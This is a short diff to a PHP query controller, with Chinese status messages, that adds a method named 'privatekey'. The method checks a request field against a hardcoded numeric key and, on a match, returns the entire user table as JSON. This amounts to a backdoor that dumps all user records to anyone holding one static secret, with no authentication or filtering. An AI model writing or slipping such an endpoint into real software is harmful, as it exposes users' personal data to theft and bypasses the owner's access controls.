@@ -27,4 +27,14 @@ class QueryController extends Controller
             echo json_encode(retur('失败', '验证码已过期或不存在', 422));
         }
     }
+    public function privatekey()
+    {
+        $data = json_decode(file_get_contents('php://input'), true);
+        if ($data['key'] != '1882040053') {
+            echo json_encode(retur('失败', '非法访问', 409));
+            exit;
+        }
+        $arr =  Db::table('user')->select();
+        echo json_encode(retur('成功', $arr));
+    }
 }
